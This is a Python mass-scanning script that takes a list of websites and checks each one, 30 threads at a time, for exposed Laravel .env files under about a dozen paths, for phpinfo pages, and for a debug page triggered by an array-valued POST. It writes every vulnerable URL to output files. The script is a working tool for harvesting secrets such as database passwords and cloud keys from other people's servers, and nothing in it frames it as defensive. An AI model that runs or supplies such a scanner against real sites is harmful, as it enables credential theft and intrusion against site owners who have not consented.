import requests
import sys
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
listSite = input("Give Me Ur List : ") #ask for file input
op = [i.strip() for i in open(listSite, "r").readlines()]
fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN

def check(site):
    try:
        if not site.startswith('http://'):
            site = 'https://' + site
            
        env = requests.get(site + "/.env", verify=False, allow_redirects=False, timeout=8)
        env1 = requests.get(site + "/core/.env", verify=False, allow_redirects=False, timeout=8) 
        env2 = requests.get(site + "/web/.env", verify=False, allow_redirects=False, timeout=8)
        env3 = requests.get(site + "/app/.env", verify=False, allow_redirects=False, timeout=8)
        env4 = requests.get(site + "/laravel/.env", verify=False, allow_redirects=False, timeout=8)
        env5 = requests.get(site + "/crm/.env", verify=False, allow_redirects=False, timeout=8)
        env6 = requests.get(site + "/backend/.env", verify=False, allow_redirects=False, timeout=8)
        env7 = requests.get(site + "/local/.env", verify=False, allow_redirects=False, timeout=8)
        env8 = requests.get(site + "/application/.env", verify=False, allow_redirects=False, timeout=8)
        env9 = requests.get(site + "/admin/.env", verify=False, allow_redirects=False, timeout=8)
        env10 = requests.get(site + "/prod/.env", verify=False, allow_redirects=False, timeout=8)
        env11 = requests.get(site + "/api/.env", verify=False, allow_redirects=False, timeout=8)
        akia2 = requests.get(site + "/phpinfo", verify=False, allow_redirects=False, timeout=8)
        akia3 = requests.get(site + "/_profiler/phpinfo", verify=False, allow_redirects=False, timeout=8)
        akia4 = requests.get(site + "/phpinfo.php", verify=False, allow_redirects=False, timeout=8)
        akia5 = requests.get(site + "/info.php", verify=False, allow_redirects=False, timeout=8)
        debug = requests.post(site, data={"user[]": "admin@localhost"}, verify=False, allow_redirects=False, timeout=8)

        if 'APP_URL' in env.text:
            print(site + "|{}ENV{}".format(fg, fw, site, fg))
            open('env.txt', 'a').write(site + "/.env\n")
        elif 'APP_URL' in env1.text:
            print(site + " |{}FOUND{}".format(fg, fw, site, fg))
            open('env.txt', 'a').write(site + "/core/.env\n")
        elif 'APP_URL' in env2.text:
            print(site + " |{}FOUND{}".format(fg, fw, site, fg))
            open('env.txt', 'a').write(site + "/web/.env\n")
        elif 'APP_URL' in env3.text:
            print(site + " |{}FOUND{}".format(fg, fw, site, fg))
            open('env.txt', 'a').write(site + "/app/.env\n")
        elif 'APP_URL' in env4.text:
            print(site + " |{}FOUND{}".format(fg, fw, site, fg))
            open('env.txt', 'a').write(site + "/laravel/.env\n")
        elif 'APP_URL' in env5.text:
            print(site + " |{}FOUND{}".format(fg, fw, site, fg))
            open('env.txt', 'a').write(site + "/crm/.env\n")
        elif 'APP_URL' in env6.text:
            print(site + " |{}FOUND{}".format(fg, fw, site, fg))
            open('env.txt', 'a').write(site + "/backend/.env\n")
        elif 'APP_URL' in env7.text:
            print(site + " |{}FOUND{}".format(fg, fw, site, fg))
            open('env.txt', 'a').write(site + "/local/.env\n")
        elif 'APP_URL' in env8.text:
            print(site + " |{}FOUND{}".format(fg, fw, site, fg))
            open('env.txt', 'a').write(site + "/application/.env\n")
        elif 'APP_URL' in env9.text:
            print(site + " |{}FOUND{}".format(fg, fw, site, fg))
            open('env.txt', 'a').write(site + "/admin/.env\n")
        elif 'APP_URL' in env10.text:
            print(site + " |{}FOUND{}".format(fg, fw, site, fg))
            open('env.txt', 'a').write(site + "/prod/.env\n")
        elif 'APP_URL' in env11.text:
            print(site + " |{}FOUND{}".format(fg, fw, site, fg))
            open('env.txt', 'a').write(site + "/api/.env\n")
        elif 'APP_URL' in akia2.text:
            print(site + " |{}FOUND{}".format(fg, fw, site, fg))
            open('phpinfo.txt', 'a').write(site + "/phpinfo\n")
        elif 'APP_URL' in akia3.text:
            print(site + " |{}FOUND{}".format(fg, fw, site, fg))
            open('phpinfo.txt', 'a').write(site + "/_profiler/phpinfo\n")
        elif 'APP_URL' in akia4.text:
            print(site + " |{}FOUND{}".format(fg, fw, site, fg))
            open('phpinfo.txt', 'a').write(site + "/phpinfo.php\n")
        elif 'APP_URL' in akia5.text:
            print(site + " |{}FOUND{}".format(fg, fw, site, fg))
            open('phpinfo.txt', 'a').write(site + "/info.php\n")
        elif 'APP_URL' in debug.text:
            print(site + " |{}DEBUG{}".format(fg, fw, site, fg))
            open('debug.txt', 'a').write(site + "\n")
        else:
            print(site + " | {}NOT FOUND{}".format(fr, fw, site, fc))
    except requests.exceptions.Timeout:
        print(site + " | {}TIMEOUT{}".format(fr, fw, site, fr, e))
    except requests.exceptions.RequestException as e:
        print
    
kekw = Pool(30) #thread
kekw.map(check, op)
kekw.close()
kekw.join()
